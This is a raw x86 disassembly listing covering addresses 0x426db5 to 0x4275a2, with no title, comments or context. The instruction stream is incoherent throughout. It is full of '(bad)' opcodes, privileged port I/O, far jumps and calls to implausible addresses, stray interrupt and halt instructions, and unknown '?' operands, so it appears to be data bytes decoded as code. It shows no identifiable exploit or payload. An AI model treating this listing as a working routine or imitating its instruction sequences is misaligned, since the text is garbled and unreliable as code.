  426db5:	mov    ebx,0xd38d4c0d
  426dba:	loop   0x426e2c
  426dbc:	ja     0x426d57
  426dbe:	fstp   QWORD PTR [edx+0x2]
  426dc1:	scas   eax,DWORD PTR es:[edi]
  426dc2:	jmp    0x521efc11
  426dc7:	out    dx,al
  426dc8:	ror    bh,1
  426dca:	retf   0x5a0d
  426dcd:	arpl   WORD PTR [edx],ax
  426dcf:	pop    edx
  426dd0:	jae    0x426d9d
  426dd2:	jne    0x426de6
  426dd4:	dec    esi
  426dd5:	push   eax
  426dd6:	and    ebx,DWORD PTR [eax+0x29061b84]
  426ddc:	xor    esi,DWORD PTR [edi-0x4aeb0382]
  426de2:	pop    esi
  426de3:	jnp    0x426d77
  426de5:	mov    bl,BYTE PTR [eax]
  426de7:	push   ecx
  426de8:	popf   
  426de9:	add    BYTE PTR [ebx+eax*8+0x29553372],bl
  426df0:	push   ds
  426df1:	add    eax,0x4368d7ce
  426df6:	out    dx,al
  426df7:	push   ebx
  426df8:	icebp  
  426df9:	inc    esp
  426dfa:	mov    ah,0x2a
  426dfc:	sub    cl,0xf8
  426dff:	iret   
  426e00:	nop
  426e01:	(bad)  
  426e02:	pop    ds
  426e03:	daa    
  426e04:	popa   
  426e05:	loop   0x426dbb
  426e07:	bound  ebp,QWORD PTR [ebp+0x6a]
  426e0a:	push   ds
  426e0b:	mov    al,ds:0x3a81a5a2
  426e10:	mov    ah,BYTE PTR [ebx+ebp*4+0x11c957db]
  426e17:	icebp  
  426e18:	cmc    
  426e19:	jl     0x426de2
  426e1b:	xchg   edx,eax
  426e1c:	out    0x5e,eax
  426e1e:	pop    edi
  426e1f:	mov    eax,ds:0x93b2e46f
  426e24:	or     esi,ecx
  426e26:	popf   
  426e27:	sub    bh,ah
  426e29:	jno    0x426e3c
  426e2b:	mov    esi,0xae4c21d
  426e30:	or     eax,0xd0f7a700
  426e35:	das    
  426e36:	adc    BYTE PTR [ebp+0x6dd651a2],0xd5
  426e3d:	enter  0xed74,0x40
  426e41:	or     al,0xf7
  426e43:	jbe    0x426e5e
  426e45:	add    BYTE PTR ds:[eax+0x7b],0x16
  426e4a:	into   
  426e4b:	jne    0x426ebe
  426e4d:	(bad)  
  426e4e:	cwde   
  426e4f:	and    ebx,DWORD PTR [edx]
  426e51:	and    al,0xd3
  426e53:	push   0x4f
  426e55:	or     al,0x2f
  426e57:	cmp    DWORD PTR [edx-0x45f0a2fb],0x42995a0f
  426e61:	pop    edx
  426e62:	fwait
  426e63:	and    eax,0x7acdf41e
  426e68:	lahf   
  426e69:	sub    BYTE PTR [eax],cl
  426e6b:	sub    BYTE PTR ds:0x856f82bf,cl
  426e71:	imul   esp,edi,0x4cbaafd4
  426e77:	jmp    0x426ecf
  426e79:	sbb    eax,0x65
  426e7c:	mov    esp,0xcbe386f4
  426e81:	test   BYTE PTR ds:0x73a106bf,0xe9
  426e88:	sub    eax,0x4075bb4f
  426e8d:	cld    
  426e8e:	leave  
  426e8f:	mov    dh,ch
  426e91:	and    al,0xf6
  426e93:	xor    esp,DWORD PTR [esi]
  426e95:	xchg   esp,eax
  426e96:	add    al,BYTE PTR [ebx+0x39]
  426e99:	mov    BYTE PTR [edi],bl
  426e9b:	inc    ebp
  426e9c:	retf   0xf94c
  426e9f:	fcmovnb st,st(0)
  426ea1:	ret    0xca8c
  426ea4:	xor    al,BYTE PTR [esp+edi*1]
  426ea7:	jmp    0xa285f8f2
  426eac:	ret    0xcf45
  426eaf:	mov    edi,ecx
  426eb1:	out    0xf8,al
  426eb3:	add    al,BYTE PTR [esi]
  426eb5:	int    0x88
  426eb7:	push   esi
  426eb8:	jnp    0x426ed1
  426eba:	sti    
  426ebb:	pushf  
  426ebc:	rol    DWORD PTR [esi+edx*4-0x61],0x12
  426ec1:	push   edx
  426ec2:	xor    eax,0xca37521f
  426ec7:	bound  esp,QWORD PTR es:[ebp-0x2a]
  426ecb:	xchg   esp,eax
  426ecc:	fs fcmovbe st,st(0)
  426ecf:	jmp    0x8ac28e74
  426ed4:	fadd   st,st(5)
  426ed6:	jg     0x426ee3
  426ed8:	cdq    
  426ed9:	sbb    eax,0x848a798a
  426ede:	jo     0x426e6d
  426ee0:	(bad)  
  426ee1:	ins    DWORD PTR es:[edi],dx
  426ee2:	mov    ch,0x0
  426ee4:	jl     0x426e73
  426ee6:	push   cs
  426ee7:	fwait
  426ee8:	jb     0x426f1f
  426eea:	dec    ecx
  426eeb:	or     al,0x6f
  426eed:	inc    edx
  426eee:	fdiv   st,st(5)
  426ef0:	icebp  
  426ef1:	xor    ah,BYTE PTR [edx-0x2f]
  426ef4:	jae    0x426ec4
  426ef6:	xchg   ecx,eax
  426ef7:	pop    ebp
  426ef8:	mov    ah,0xc2
  426efa:	and    BYTE PTR [ebx+eiz*8+0x26bc66f7],0xfa
  426f02:	fcmovnb st,st(4)
  426f04:	fs sti 
  426f06:	and    eax,0xeef52977
  426f0b:	pop    ebx
  426f0c:	sbb    DWORD PTR [edi],0xce821eba
  426f12:	mov    cl,0xdc
  426f14:	inc    eax
  426f15:	mov    cl,0xdd
  426f17:	imul   eax,DWORD PTR [ecx+0x2e],0xd8e2642f
  426f1e:	cmc    
  426f1f:	xlat   BYTE PTR ds:[ebx]
  426f20:	nop
  426f21:	push   ss
  426f22:	lods   al,BYTE PTR ds:[esi]
  426f23:	cli    
  426f24:	into   
  426f25:	mov    fs,WORD PTR [edx+0x1e]
  426f28:	mov    ebx,0x148f132
  426f2d:	or     ah,bh
  426f2f:	jge    0x426f9d
  426f31:	dec    esi
  426f32:	mov    ecx,0x43ceb84a
  426f37:	outs   dx,BYTE PTR ds:[esi]
  426f38:	in     eax,dx
  426f39:	in     al,0xf7
  426f3b:	sub    al,0x91
  426f3d:	xor    BYTE PTR [ebx-0x34a5da04],0xd0
  426f44:	iret   
  426f45:	push   edi
  426f46:	clc    
  426f47:	out    0xb2,al
  426f49:	push   ecx
  426f4a:	or     bh,BYTE PTR [ecx+edi*8-0x19fde2ba]
  426f51:	mov    bh,0x2a
  426f53:	push   es
  426f54:	jl     0x426f43
  426f56:	jbe    0x426f90
  426f58:	or     al,0xf8
  426f5a:	push   ecx
  426f5b:	popf   
  426f5c:	aad    0x6e
  426f5e:	(bad)  
  426f5f:	(bad)  
  426f60:	xlat   BYTE PTR ds:[ebx]
  426f61:	add    esi,edx
  426f63:	inc    edi
  426f64:	sub    DWORD PTR [ebx-0x2fcf8296],edx
  426f6a:	ss jne 0x426f33
  426f6d:	inc    ecx
  426f6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426f6f:	ror    al,0x27
  426f72:	aas    
  426f73:	jecxz  0x426fa1
  426f75:	dec    edi
  426f76:	sbb    eax,0x16a6b463
  426f7b:	jle    0x426f39
  426f7d:	dec    eax
  426f7e:	enter  0x20a7,0x92
  426f82:	bound  ebx,QWORD PTR [ebx]
  426f84:	ss call 0x74841e68
  426f8a:	rcpps  xmm1,XMMWORD PTR [edi+0x33]
  426f8e:	mov    ebp,0xba47f7f6
  426f93:	or     eax,0xaf0cd00
  426f98:	mov    edi,0xc005c47d
  426f9d:	and    eax,0x4b4748ab
  426fa2:	pop    ebp
  426fa3:	jns    0x426f9d
  426fa5:	pop    ds
  426fa6:	and    cl,ch
  426fa8:	xchg   ebp,eax
  426fa9:	xchg   ah,dl
  426fab:	cmp    eax,0xd41015d2
  426fb0:	ins    BYTE PTR es:[edi],dx
  426fb1:	pop    ecx
  426fb2:	pop    ebp
  426fb3:	mov    ch,0x58
  426fb5:	inc    eax
  426fb6:	sbb    ch,BYTE PTR [ebp-0x78709fbe]
  426fbc:	ja     0x426fbc
  426fbe:	pop    DWORD PTR [edi-0x16]
  426fc1:	jb     0x426fff
  426fc3:	adc    BYTE PTR [ebx],ah
  426fc5:	push   ebx
  426fc6:	dec    esp
  426fc7:	data16 fstp QWORD PTR [eax]
  426fca:	mov    dh,0xd4
  426fcc:	(bad)
  426fcf:	lods   al,BYTE PTR ds:[esi]
  426fd0:	sub    edx,DWORD PTR [eax+0x65dde0f7]
  426fd6:	call   0x5884ff6c
  426fdb:	push   edx
  426fdc:	ret    
  426fdd:	cmp    BYTE PTR [edx-0x33],bl
  426fe0:	dec    esp
  426fe1:	sbb    ebp,DWORD PTR [esp+ecx*2-0x37]
  426fe5:	jne    0x426f9f
  426fe7:	adc    eax,0x5c7e1958
  426fec:	and    al,0x59
  426fee:	ss (bad) 
  426ff0:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426ff2:	pop    ecx
  426ff3:	cld    
  426ff4:	aas    
  426ff5:	gs popa 
  426ff7:	mov    ah,0x4f
  426ff9:	fist   WORD PTR [ecx]
  426ffb:	(bad)  
  426ffc:	shr    ch,1
  426ffe:	lahf   
  426fff:	loop   0x427028
  427001:	aaa    
  427002:	add    ch,BYTE PTR [esi+0x60b9d2dc]
  427008:	and    DWORD PTR [edi],0x67c5c3cf
  42700e:	cmp    BYTE PTR [ecx+edx*2+0x42],bl
  427012:	(bad)  
  427013:	fwait
  427014:	and    BYTE PTR [edi],0x36
  427017:	push   ecx
  427018:	test   BYTE PTR [eax],al
  42701a:	fwait
  42701b:	mov    ch,0x18
  42701d:	retf   
  42701e:	hlt    
  42701f:	and    ebx,ecx
  427021:	add    edx,DWORD PTR [esi+0xf8f167]
  427027:	push   esi
  427028:	rcl    DWORD PTR [eax+0x10],1
  42702b:	add    bl,BYTE PTR [edi-0x24916cb]
  427031:	adc    DWORD PTR [edx-0x5],0xc344c483
  427038:	rcr    BYTE PTR [ebx],0xf4
  42703b:	adc    al,0xee
  42703d:	push   ds
  42703e:	aam    0xc
  427040:	ins    DWORD PTR es:[edi],dx
  427041:	pop    edi
  427042:	sub    dl,BYTE PTR [edi]
  427044:	jg     0x42700a
  427046:	adc    eax,0x28185359
  42704b:	dec    edx
  42704c:	push   cs
  42704d:	(bad)  
  42704f:	popf   
  427050:	sub    al,0xae
  427052:	sbb    ebx,DWORD PTR [ebp+0x13fbb63]
  427058:	add    BYTE PTR [ebx+ebx*2],0x8b
  42705c:	cmp    ah,BYTE PTR [esi]
  42705e:	adc    esi,DWORD PTR ds:[ebp+0x13aad68a]
  427065:	or     ebx,DWORD PTR [ebx-0x10c0d3cb]
  42706b:	mov    ecx,0xe62c86eb
  427070:	jno    0x4270a7
  427072:	pop    edx
  427073:	out    0xfa,al
  427075:	mov    BYTE PTR [edi+ebp*4-0x29d44503],al
  42707c:	mov    ds:0x574ced3d,al
  427081:	pusha  
  427082:	pushf  
  427083:	ja     0x42705a
  427085:	call   0x696d13e
  42708a:	(bad)  
  42708c:	popa   
  42708d:	jne    0x4270c7
  42708f:	icebp  
  427090:	fild   DWORD PTR [eax]
  427092:	mov    ah,0x2f
  427094:	adc    eax,0x8beedc6a
  427099:	pop    ebx
  42709a:	sbb    DWORD PTR [ebx+0x8edbecc],edx
  4270a0:	pop    esp
  4270a1:	mov    bh,bh
  4270a3:	push   esp
  4270a4:	mov    eax,ds:0x34039f07
  4270a9:	xchg   esp,eax
  4270aa:	jmp    0x90c:0x30a42742
  4270b1:	mov    BYTE PTR [esi+0x37ce1811],ch
  4270b7:	into   
  4270b8:	and    bl,BYTE PTR [ebx+0x44d99a6b]
  4270be:	sub    al,0x7d
  4270c0:	shl    edx,1
  4270c2:	mov    eax,ds:0x853033fc
  4270c7:	adc    cl,bl
  4270c9:	inc    esp
  4270ca:	fcom   DWORD PTR [ecx+0x7c6b9de3]
  4270d0:	xchg   ebx,eax
  4270d1:	push   0x9c75d163
  4270d6:	or     bl,BYTE PTR [edx-0x19820ec3]
  4270dc:	jae    0x427114
  4270de:	xlat   BYTE PTR ds:[ebx]
  4270df:	cs cmc 
  4270e1:	stos   DWORD PTR es:[edi],eax
  4270e2:	xchg   edi,eax
  4270e3:	in     eax,0xf4
  4270e5:	inc    ecx
  4270e6:	cmp    al,0x83
  4270e8:	fdivrp st(2),st
  4270ea:	addr16 adc dh,ch
  4270ed:	aad    0xbb
  4270ef:	lsl    esp,WORD PTR [ecx-0x10]
  4270f3:	gs (bad) 
  4270f6:	jg     0x42711e
  4270f8:	jno    0x4270a1
  4270fa:	or     dh,BYTE PTR [eax+0x6f]
  4270fd:	mov    bh,0xdf
  4270ff:	mov    ds:0x9a99289c,al
  427104:	stos   DWORD PTR es:[edi],eax
  427105:	xchg   BYTE PTR [eax-0x4e8554aa],al
  42710b:	push   cs
  42710c:	daa    
  42710d:	jmp    0xb771c003
  427112:	push   ebx
  427113:	imul   edx,DWORD PTR [esi+ecx*1],0xddc4da4
  42711a:	or     al,0xdf
  42711c:	pop    ebp
  42711d:	mov    esi,0x2c34d8ef
  427122:	jge    0x427132
  427124:	jo     0x427119
  427126:	ds out dx,eax
  427128:	push   eax
  427129:	inc    edi
  42712a:	jb     0x427165
  42712c:	fsubr  st(1),st
  42712e:	outs   dx,BYTE PTR ds:[esi]
  42712f:	mov    bl,0x36
  427131:	test   al,0xd0
  427133:	aam    0xe6
  427135:	pop    ecx
  427136:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427137:	pop    edx
  427138:	mov    DWORD PTR [edx-0x59],ebx
  42713b:	stc    
  42713c:	mov    al,0x25
  42713e:	push   0x64
  427140:	lods   eax,DWORD PTR ds:[esi]
  427141:	mov    edi,0xbc337c4f
  427146:	aas    
  427147:	mov    ebp,0xadeb9157
  42714c:	ficom  WORD PTR [eax+0x28]
  42714f:	pop    eax
  427150:	nop
  427151:	or     ecx,DWORD PTR [edx]
  427153:	fucomi st,st(4)
  427155:	fstp   TBYTE PTR [esi+0x64]
  427158:	inc    ecx
  427159:	out    dx,eax
  42715a:	pop    edx
  42715b:	mov    BYTE PTR [esi+0x53],ah
  42715e:	(bad)  
  42715f:	xor    DWORD PTR [ebx],esi
  427161:	std    
  427162:	cdq    
  427163:	jmp    0x4271c8
  427165:	out    0xbd,eax
  427167:	mov    dh,0xf3
  427169:	call   DWORD PTR [edx]
  42716b:	dec    edi
  42716c:	cmp    esp,DWORD PTR [ebx]
  42716e:	gs push ss
  427170:	std    
  427171:	dec    esi
  427172:	rep ss ins BYTE PTR es:[edi],dx
  427175:	xor    al,0xd5
  427177:	das    
  427178:	sbb    eax,0xa0e6076d
  42717d:	out    dx,al
  42717e:	div    DWORD PTR [ecx]
  427180:	adc    dh,BYTE PTR [ebx-0x6c]
  427183:	jmp    0xdc61e7cb
  427188:	mov    dh,0x1d
  42718a:	shl    BYTE PTR [eax+esi*2+0x5b],1
  42718e:	jno    0x427180
  427190:	(bad)  
  427191:	add    eax,0x9d4f49d6
  427196:	sub    al,0x7b
  427198:	dec    esi
  427199:	mov    ds:0x15273ee7,al
  42719e:	inc    ecx
  42719f:	out    0xac,al
  4271a1:	arpl   WORD PTR [ecx-0x50],bp
  4271a4:	dec    ecx
  4271a5:	test   BYTE PTR [ebp-0x224dc5db],dl
  4271ab:	js     0x4271b5
  4271ad:	add    BYTE PTR [eax],al
  4271af:	add    BYTE PTR [eax],al
  4271b1:	add    BYTE PTR [ebx],ch
  4271b3:	xchg   DWORD PTR [ebp-0x1f],esi
  4271b6:	std    
  4271b7:	repz mov edi,0x7da68ccf
  4271bd:	inc    ecx
  4271be:	xchg   DWORD PTR [ecx],ebp
  4271c0:	jmp    0x22c12f2
  4271c5:	add    bl,dh
  4271c7:	add    al,0x0
  4271c9:	add    BYTE PTR [ebx],ah
  4271cb:	jnp    0x4271a6
  4271cd:	xchg   dx,ax
  4271cf:	mul    BYTE PTR [ecx+0x7a561955]
  4271d5:	push   cs
  4271d6:	mov    esp,0x69e0716a
  4271db:	sbb    ch,BYTE PTR [ebx]
  4271dd:	push   ecx
  4271de:	jecxz  0x4271b0
  4271e0:	push   ss
  4271e1:	pop    edi
  4271e2:	jg     0x42716c
  4271e4:	mov    gs,WORD PTR [edi+0x33]
  4271e7:	hlt    
  4271e8:	mov    esi,0x36b8404a
  4271ed:	in     al,0xb5
  4271ef:	or     edx,DWORD PTR [edx-0x6b2e1b50]
  4271f5:	sbb    eax,0x73563ec5
  4271fa:	and    al,0x18
  4271fc:	ss push ecx
  4271fe:	push   ebp
  4271ff:	jmp    0x427244
  427201:	repz shl DWORD PTR [eax],0xa9
  427205:	test   DWORD PTR [ebx+0x50],esi
  427208:	xor    ah,bh
  42720a:	jbe    0x42718d
  42720c:	pop    ecx
  42720d:	sbb    ebx,DWORD PTR [ecx]
  42720f:	add    DWORD PTR [ebx],edi
  427211:	(bad)  
  427212:	jnp    0x4271ad
  427214:	in     al,dx
  427215:	(bad)  
  427216:	or     DWORD PTR [ecx+0x232764a],edi
  42721c:	dec    ebx
  42721d:	and    esp,DWORD PTR ds:0x46fcc4f8
  427223:	add    al,0xb0
  427225:	add    BYTE PTR [edi],ah
  427227:	outs   dx,DWORD PTR ds:[esi]
  427228:	addr16 adc eax,0x752e6855
  42722e:	rcr    BYTE PTR [ecx+edx*1+0x64],cl
  427232:	sahf   
  427233:	xor    eax,0xa3c1998e
  427238:	leave  
  427239:	or     al,0xa7
  42723b:	(bad)  
  42723c:	xchg   ebp,eax
  42723d:	push   0x6d6d51c3
  427242:	ret    
  427243:	mov    bh,0x13
  427245:	jne    0x427272
  427247:	imul   edx,DWORD PTR [ebp+esi*2+0x52],0xffffffb9
  42724c:	in     al,dx
  42724d:	jmp    0xf563:0x1449e071
  427254:	inc    ebx
  427255:	mov    esp,0x9052cdd
  42725a:	ret    0x17b3
  42725d:	and    al,bh
  42725f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427260:	or     BYTE PTR [edx],al
  427262:	lock cmp edx,DWORD PTR [eax]
  427265:	jmp    0xd62:0x1966d5bf
  42726c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42726d:	(bad)  
  42726e:	xchg   esp,eax
  42726f:	ins    BYTE PTR es:[edi],dx
  427270:	fcomp  DWORD PTR ds:0x432ac1b4
  427276:	or     dh,bl
  427278:	mov    DWORD PTR [ebx+0x2b93780d],ebx
  42727e:	inc    ebx
  42727f:	int    0x69
  427281:	arpl   WORD PTR [eax-0x58],sp
  427284:	pop    edx
  427285:	dec    ebx
  427286:	and    bh,BYTE PTR [eax]
  427288:	jmp    0x86c4644c
  42728d:	sub    ecx,DWORD PTR [ecx+ecx*8+0x320010b8]
  427294:	adc    BYTE PTR [ecx+0x10],0x1
  427298:	aam    0xdf
  42729a:	mov    dl,0xa2
  42729c:	jmp    FWORD PTR [ebp-0x23da6897]
  4272a2:	scas   eax,DWORD PTR es:[edi]
  4272a3:	adc    edx,eax
  4272a5:	bnd jo 0x427245
  4272a8:	cs aad 0x50
  4272ab:	ins    DWORD PTR es:[edi],dx
  4272ac:	nop
  4272ad:	pusha  
  4272ae:	mov    ebx,0xfa7ea366
  4272b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4272b4:	out    0x8d,eax
  4272b6:	(bad)  
  4272b7:	fdiv   DWORD PTR [esi]
  4272b9:	lods   al,BYTE PTR ds:[esi]
  4272ba:	xor    dh,BYTE PTR [ecx+0x4]
  4272bd:	lea    ecx,[eax-0x3e8a5c95]
  4272c3:	pop    edi
  4272c4:	enter  0x42cc,0xfc
  4272c8:	mov    fs,WORD PTR [ecx+ebx*1+0xa41d708]
  4272cf:	sbb    BYTE PTR [esi-0x65],al
  4272d2:	loopne 0x42733f
  4272d4:	je     0x427306
  4272d6:	daa    
  4272d7:	xor    BYTE PTR [ebx-0x22],ch
  4272da:	fchs   
  4272dc:	cmc    
  4272dd:	xor    DWORD PTR [edi+0xf6d085],eax
  4272e3:	adc    DWORD PTR [ebp+ecx*2+0x2ad38adc],0xfffffff0
  4272eb:	jl     0x427348
  4272ed:	mov    dh,0xa8
  4272ef:	xor    eax,0x9f57352c
  4272f4:	mov    ch,0xb8
  4272f6:	fsub   QWORD PTR [eax-0x73]
  4272f9:	xor    edx,DWORD PTR [edx+edx*2-0x4e]
  4272fd:	mov    dl,0xdc
  4272ff:	lock mov ecx,0x8a4af5f8
  427305:	stos   DWORD PTR es:[edi],eax
  427306:	xor    ah,BYTE PTR [eax-0x60f6c05a]
  42730c:	mov    ds:0x1a766a43,eax
  427311:	adc    BYTE PTR [ecx+0x7247df26],ch
  427317:	pop    edx
  427318:	adc    BYTE PTR [ebx+0x1a],0x15
  42731c:	lea    ecx,[edx-0x5db79741]
  427322:	jle    0x4272b4
  427324:	or     BYTE PTR [edx-0x8a702e7],ch
  42732a:	ret    
  42732b:	sti    
  42732c:	or     BYTE PTR [eax*1-0x75643b36],bl
  427333:	ret    
  427334:	pop    esp
  427335:	fcom   st(5)
  427337:	mov    ebx,DWORD PTR [eax+ebp*2-0x3e]
  42733b:	in     eax,dx
  42733c:	and    eax,0x9fc7d002
  427341:	mov    eax,0x1e19f6ed
  427346:	pop    ds
  427347:	mov    ch,BYTE PTR [ecx]
  427349:	daa    
  42734a:	rcr    BYTE PTR [eax+edi*1-0x56],cl
  42734e:	push   ebx
  42734f:	mov    ah,0x90
  427351:	cs in  eax,0x73
  427354:	cmp    cl,BYTE PTR [edx-0x6f524644]
  42735a:	(bad)  
  42735c:	xchg   ebx,eax
  42735d:	jp     0x427346
  42735f:	outs   dx,BYTE PTR ds:[esi]
  427360:	cmp    eax,0x7dbd16e8
  427365:	jae    0x427352
  427367:	push   eax
  427368:	pop    es
  427369:	retf   0x8d5f
  42736c:	repnz mov ah,0xac
  42736f:	cmc    
  427370:	fiadd  WORD PTR [edi]
  427372:	pop    ebp
  427373:	sar    BYTE PTR [eax+0x16],cl
  427376:	mov    esp,0x669cdc6a
  42737b:	in     al,dx
  42737c:	test   al,0x1a
  42737e:	or     esp,DWORD PTR [eax-0x3e073f7b]
  427384:	dec    ecx
  427385:	lahf   
  427386:	cmp    DWORD PTR [eax-0x49],esp
  427389:	pop    esp
  42738a:	scas   eax,DWORD PTR es:[edi]
  42738b:	div    eax
  42738d:	in     eax,0x40
  42738f:	or     dl,al
  427391:	xchg   al,ch
  427393:	xor    al,0x74
  427395:	bnd jo 0x4273e6
  427398:	pop    es
  427399:	lds    esp,FWORD PTR [ecx-0x54]
  42739c:	dec    esp
  42739d:	outs   dx,DWORD PTR ds:[esi]
  42739e:	scas   eax,DWORD PTR es:[edi]
  42739f:	xor    BYTE PTR [ebp-0x568cf60b],bh
  4273a5:	jp     0x4273aa
  4273a7:	or     eax,0x602b2385
  4273ac:	and    al,0x9c
  4273ae:	add    bl,BYTE PTR [ecx]
  4273b0:	jp     0x4273fa
  4273b2:	push   0x52301329
  4273b7:	and    DWORD PTR [esi+0x3d20fa1f],ebp
  4273bd:	adc    eax,0xb066b182
  4273c2:	clc    
  4273c3:	xor    edx,ecx
  4273c5:	jg     0x4273b9
  4273c7:	sbb    DWORD PTR [ebp-0x62],edi
  4273ca:	jno    0x42738d
  4273cc:	mov    ds:0x5646518f,eax
  4273d1:	or     BYTE PTR [eax],cl
  4273d3:	sub    eax,0x614d9532
  4273d8:	mov    BYTE PTR [eax+0x9],0x49
  4273dc:	lds    ecx,FWORD PTR [edi]
  4273de:	cli    
  4273df:	mov    ah,0x3b
  4273e1:	mov    dl,0x21
  4273e3:	and    DWORD PTR [esp+eax*4],ebp
  4273e6:	addr16 inc esp
  4273e8:	sub    al,BYTE PTR [ecx]
  4273ea:	popa   
  4273eb:	popf   
  4273ec:	test   al,0xf9
  4273ee:	xchg   ebx,eax
  4273ef:	sub    ebp,esp
  4273f1:	pop    edx
  4273f2:	(bad)  
  4273f3:	out    dx,eax
  4273f4:	lods   al,BYTE PTR ds:[esi]
  4273f5:	mov    edx,?
  4273f7:	sub    DWORD PTR [edx+ebx*2],edx
  4273fa:	sbb    edx,DWORD PTR [esi+ebx*4]
  4273fd:	mov    ds:0xbffaa816,eax
  427402:	add    DWORD PTR [edi+0x2ccda5ec],esp
  427408:	mov    ah,0x52
  42740a:	inc    esp
  42740b:	mov    ebx,0x161692c1
  427410:	sbb    eax,0x23c15b38
  427415:	mov    ebp,0x70fc1b71
  42741a:	popf   
  42741b:	(bad)  
  42741c:	mov    ds:0xdea13d8b,al
  427421:	or     ebx,DWORD PTR [edx+0x78]
  427424:	pop    ecx
  427425:	scas   eax,DWORD PTR es:[edi]
  427426:	xlat   BYTE PTR ds:[ebx]
  427427:	jmp    0x10b4:0x462b7830
  42742e:	pushf  
  42742f:	jae    0x4273d7
  427431:	sbb    al,0xd
  427433:	das    
  427434:	out    0xb0,eax
  427436:	and    al,0xd9
  427438:	inc    ebp
  427439:	cmp    eax,eax
  42743b:	out    0xb5,al
  42743d:	cmp    eax,0xc6713806
  427442:	imul   ecx,DWORD PTR [edx-0x3cff7f7],0x10
  427449:	pop    ebp
  42744a:	ret    
  42744b:	or     DWORD PTR [edi-0x501eef4c],esi
  427451:	xchg   esp,eax
  427452:	xchg   ecx,eax
  427453:	sub    eax,0x51d4d812
  427458:	ret    
  427459:	sub    DWORD PTR [ebx+0x5ee8a408],edx
  42745f:	cmp    al,0xdc
  427461:	ficom  WORD PTR [esi]
  427463:	les    edi,FWORD PTR [esi]
  427465:	nop
  427466:	xchg   esi,eax
  427467:	stos   BYTE PTR es:[edi],al
  427468:	adc    eax,0xf00818ba
  42746d:	add    cl,BYTE PTR es:[edx+0x3d]
  427471:	call   0xab040c18
  427476:	in     al,dx
  427477:	gs jecxz 0x42749e
  42747a:	fnsave [edi]
  42747c:	test   eax,0x9fc81ff5
  427481:	and    DWORD PTR [edx+0x75176cbc],edi
  427487:	sti    
  427488:	sti    
  427489:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42748a:	fdiv   QWORD PTR ds:0xe832b62e
  427490:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427491:	sbb    BYTE PTR [ecx],bh
  427493:	call   0xcc00:0xaff2e33f
  42749a:	test   eax,0x252b5502
  42749f:	mov    dl,0x7c
  4274a1:	arpl   ax,cx
  4274a3:	dec    ecx
  4274a4:	mov    BYTE PTR [ebx],0xbd
  4274a7:	xchg   edx,eax
  4274a8:	icebp  
  4274a9:	(bad)  
  4274aa:	call   0xa5faae61
  4274af:	pop    ecx
  4274b0:	mov    bl,0xfa
  4274b2:	sbb    cl,BYTE PTR [edi]
  4274b4:	retf   0x2271
  4274b7:	inc    ebp
  4274b8:	mov    dl,0x47
  4274ba:	pop    eax
  4274bb:	(bad)  
  4274bc:	loopne 0x427537
  4274be:	mov    esp,0x31ee40e
  4274c3:	push   ds
  4274c4:	(bad)  
  4274c5:	std    
  4274c6:	fs xor eax,0x25e9987c
  4274cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4274cd:	(bad)  
  4274cf:	bound  edi,QWORD PTR [esi+0x5a9b14c9]
  4274d5:	cmp    ah,BYTE PTR [esi-0x79]
  4274d8:	in     al,0x1a
  4274da:	jle    0x427475
  4274dc:	sub    esp,esi
  4274de:	add    ebx,edx
  4274e0:	dec    edx
  4274e1:	mov    esp,ebx
  4274e3:	je     0x427556
  4274e5:	fsub   QWORD PTR [ebp*8-0x2c82f658]
  4274ec:	and    edi,DWORD PTR [edi+ecx*2]
  4274ef:	stc    
  4274f0:	push   0xffffff9b
  4274f2:	rol    cl,cl
  4274f4:	mov    ecx,0x5f08cf74
  4274f9:	cmp    al,0xb2
  4274fb:	fwait
  4274fc:	and    ebx,DWORD PTR [eax+0xb]
  4274ff:	(bad)  
  427500:	clc    
  427501:	mov    esp,esp
  427503:	sub    eax,0x9dff4439
  427508:	es xchg esp,eax
  42750a:	neg    BYTE PTR [ecx+ebp*1]
  42750d:	xlat   BYTE PTR ds:[ebx]
  42750e:	mov    WORD PTR [edi],?
  427510:	xchg   esp,eax
  427511:	sbb    bl,bl
  427513:	sbb    eax,0x4fdce8ed
  427518:	fnstenv [ebx-0x511dbc7a]
  42751e:	and    edi,edi
  427520:	iret   
  427521:	stos   DWORD PTR es:[edi],eax
  427522:	and    al,0xa7
  427524:	sub    cl,BYTE PTR [ebx]
  427526:	shr    BYTE PTR [ecx+0x5f085837],cl
  42752c:	jg     0x42754a
  42752e:	adc    esi,ecx
  427530:	cmp    DWORD PTR [esi+edi*2+0x11564ea5],0x67
  427538:	jmp    0x42751c
  42753a:	js     0x42757f
  42753c:	cld    
  42753d:	fdiv   QWORD PTR [edi+0x5a]
  427540:	and    edi,DWORD PTR [ecx]
  427542:	add    ah,cl
  427544:	cwde   
  427545:	fbstp  TBYTE PTR [ebx]
  427547:	imul   BYTE PTR [edi+0x7f67a90f]
  42754d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42754e:	test   BYTE PTR [esi+0x1b],al
  427551:	enterw 0x9f80,0xb1
  427556:	int    0x91
  427558:	mov    eax,?
  42755a:	push   esp
  42755b:	cmp    al,0x29
  42755d:	jp     0x42756f
  42755f:	rol    DWORD PTR [eax+eiz*4-0x7ff7381d],1
  427566:	mov    bl,0x91
  427568:	loope  0x4275cd
  42756a:	out    0xe1,al
  42756c:	push   esp
  42756d:	dec    ecx
  42756e:	xchg   ecx,eax
  42756f:	call   0x4662423a
  427574:	mov    DWORD PTR [edx],eax
  427576:	xchg   ebp,eax
  427577:	(bad)  
  427578:	rcl    BYTE PTR [ebx+0x3b],1
  42757b:	add    edi,DWORD PTR [edi+ebx*1+0x7d3ed3e8]
  427582:	mov    ds:0xc62689ab,eax
  427587:	jno    0x4275be
  427589:	inc    ebx
  42758a:	jmp    0x9aee4816
  42758f:	or     ebp,DWORD PTR [ebp+0x5]
  427592:	stos   DWORD PTR es:[edi],eax
  427593:	push   eax
  427594:	mov    ds:0x6fea271c,al
  427599:	add    esp,0x50127fc7
  42759f:	cwde   
  4275a0:	mov    cl,0x3c
  4275a2:	jne    0x42758a
